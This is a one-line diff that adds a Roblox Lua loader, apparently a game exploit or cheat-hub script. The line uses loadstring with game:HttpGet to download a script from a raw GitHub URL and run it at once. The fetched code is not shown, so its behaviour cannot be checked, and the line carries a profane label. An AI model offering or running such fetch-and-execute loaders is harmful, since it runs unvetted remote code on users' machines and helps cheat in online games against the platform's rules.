@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/IHateSchoolIsCool/FuckCheapShops/main/Schoolhub%20Selector"))("Fuck Cheap Shops")
